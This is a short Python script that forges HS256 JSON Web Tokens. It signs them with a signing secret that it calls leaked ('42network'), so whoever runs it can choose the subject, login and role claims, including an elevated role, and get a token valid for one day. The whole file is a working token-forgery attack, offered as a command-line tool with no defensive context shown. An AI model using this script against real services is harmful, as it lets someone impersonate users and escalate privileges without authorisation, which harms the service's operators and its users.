#!/usr/bin/env python3
"""Forge an HS256 JWT with the leaked signing secret "42network".

Usage: forge_jwt.py <sub> <login> <role> [secret]
"""
import sys
import time
import hmac
import hashlib
import base64
import json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def forge(sub: str, login: str, role: str, secret: str = "42network") -> str:
    header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({
        "sub": sub, "login": login, "role": role,
        "exp": int(time.time()) + 86400,
    }).encode())
    signing_input = f"{header}.{payload}".encode()
    sig = b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
    return f"{header}.{payload}.{sig}"

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(__doc__); sys.exit(1)
    sub, login, role = sys.argv[1:4]
    secret = sys.argv[4] if len(sys.argv) > 4 else "42network"
    print(forge(sub, login, role, secret))
